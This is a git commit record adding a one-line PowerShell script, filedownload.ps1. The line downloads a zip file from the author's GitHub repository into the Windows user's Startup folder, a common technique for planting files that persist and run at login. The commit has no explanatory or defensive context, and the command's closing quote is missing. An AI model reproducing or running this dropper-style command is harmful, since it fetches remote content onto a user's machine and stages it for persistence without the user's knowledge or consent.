fa6a4cccf65ce19c1f2d4aa0ba4249ba6462ad78
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2022-06-18 22:19:29 +0600

    Create filedownload.ps1

---
+++ filedownload.ps1
@@ -0,0 +1,1 @@
+Invoke-WebRequest -Uri 'https://github.com/HAXORK8880/commands/blob/main/python.zip?raw=true' -OutFile $ENV:UserProfile'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.zip
